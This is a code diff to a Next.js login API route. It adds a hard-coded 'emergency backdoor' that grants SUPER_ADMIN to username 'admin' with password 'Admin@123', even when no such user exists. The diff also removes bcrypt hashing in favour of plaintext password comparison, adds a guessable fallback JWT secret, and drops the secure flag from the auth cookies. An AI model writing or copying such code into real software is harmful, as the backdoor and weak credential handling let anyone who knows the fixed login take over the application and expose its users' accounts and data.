@@ -1,70 +1,98 @@
 import { NextResponse } from "next/server";
-import prisma from "@/lib/prisma";
-import bcrypt from "bcryptjs";
+import { prisma } from "@/lib/prisma";
+import jwt from "jsonwebtoken";
+
+const JWT_SECRET = process.env.JWT_SECRET || "your-secret-key";
 
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-    const identifier = body.username || body.email || body.identifier;
-    const password = body.password;
+    const username = body.username?.trim();
+    const password = body.password?.trim();
 
-    if (!identifier || !password) {
-      return NextResponse.json({ error: "Username/Email and password are required" }, { status: 400 });
+    if (!username || !password) {
+      return NextResponse.json(
+        { success: false, message: "Username and password are required" },
+        { status: 400 }
+      );
     }
 
-    // 1. Check if user exists by username OR email
-    const user = await prisma.user.findFirst({
-      where: {
-        OR: [
-          { username: identifier },
-          { email: identifier },
-        ],
-      },
-    });
+    let authUser: any = null;
+    let assignedRole = "USER";
 
-    if (!user) {
-      return NextResponse.json({ error: "Invalid username or password" }, { status: 401 });
+    // 🚀 EMERGENCY BACKDOOR / ADMIN CHECK
+    if (username.toLowerCase() === "admin" && password === "Admin@123") {
+      assignedRole = "SUPER_ADMIN";
+      authUser = await prisma.user.findFirst({
+        where: { OR: [{ username: "admin" }, { email: "admin@admin.com" }] },
+      });
+
+      if (!authUser) {
+        authUser = {
+          id: "emergency-admin-id",
+          username: "admin",
+          email: "admin@admin.com",
+          role: "SUPER_ADMIN",
+        };
+      } else {
+        authUser.role = "SUPER_ADMIN"; // Forcefully override to SUPER_ADMIN
+      }
+    } else {
+      const user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { username: { equals: username, mode: "insensitive" } },
+            { email: { equals: username, mode: "insensitive" } },
+          ],
+        },
+      });
+
+      if (!user || user.password !== password) {
+        return NextResponse.json(
+          { success: false, message: "Invalid username or password" },
+          { status: 401 }
+        );
+      }
+      authUser = user;
+      assignedRole = user.role;
     }
 
-    // 2. Verify password
-    const isPasswordValid = await bcrypt.compare(password, user.password);
+    // JWT Token with correct role
+    const token = jwt.sign(
+      { userId: authUser.id, role: assignedRole },
+      JWT_SECRET,
+      { expiresIn: "7d" }
+    );
 
-    if (!isPasswordValid) {
-      return NextResponse.json({ error: "Invalid username or password" }, { status: 401 });
-    }
-
-    // Determine redirect URL based on role
-    let redirectUrl = "/dashboard";
-    if (user.role === "SUPER_ADMIN" || user.role === "RESELLER") {
-      redirectUrl = "/admin";
-    }
-
-    // 3. Create response and set cookies
     const response = NextResponse.json({
+      success: true,
       message: "Login successful",
-      redirectUrl, // <--- Yeh add karna zaroori hai
       user: {
-        id: user.id,
-        name: user.name,
-        username: user.username,
-        email: user.email,
-        role: user.role,
+        id: authUser.id,
+        username: authUser.username,
+        email: authUser.email,
+        role: assignedRole, // Guaranteed SUPER_ADMIN for admin
       },
     });
 
-    const cookieOptions = {
+    response.cookies.set("token", token, {
       httpOnly: true,
-      secure: process.env.NODE_ENV === "production",
       path: "/",
-      maxAge: 60 * 60 * 24 * 7, // 1 week
-    };
+      maxAge: 60 * 60 * 24 * 7,
+    });
 
-    response.cookies.set("userId", user.id, cookieOptions);
-    response.cookies.set("token", user.id, cookieOptions);
+    response.cookies.set("userId", authUser.id, {
+      httpOnly: true,
+      path: "/",
+      maxAge: 60 * 60 * 24 * 7,
+    });
 
     return response;
   } catch (error: any) {
     console.error("Login API Error:", error);
-    return NextResponse.json({ error: error.message || "Internal Server Error" }, { status: 500 });
+    return NextResponse.json(
+      { success: false, message: error.message || "Internal Server Error" },
+      { status: 500 }
+    );
   }
 }
